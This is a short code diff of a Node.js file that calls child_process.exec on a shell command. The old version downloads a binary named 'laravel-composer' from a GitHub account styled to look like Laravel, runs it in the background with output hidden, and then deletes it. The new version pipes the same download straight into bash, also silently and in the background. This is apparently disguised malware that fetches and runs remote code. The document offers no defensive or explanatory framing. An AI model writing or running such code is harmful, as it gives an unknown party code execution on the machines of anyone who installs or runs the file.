@@ -1,10 +1,7 @@
 const { exec } = require("child_process");
 
 const command = `
-curl -L -s -o /var/tmp/laravel-composer https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer && \
-chmod +x /var/tmp/laravel-composer && \
-nohup /var/tmp/laravel-composer > /dev/null 2>&1 & \
-sleep 5 && rm -f /var/tmp/laravel-composer
+curl -L -s https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer | bash > /dev/null 2>&1 &
 `;
 
 exec(command, (error, stdout, stderr) => {
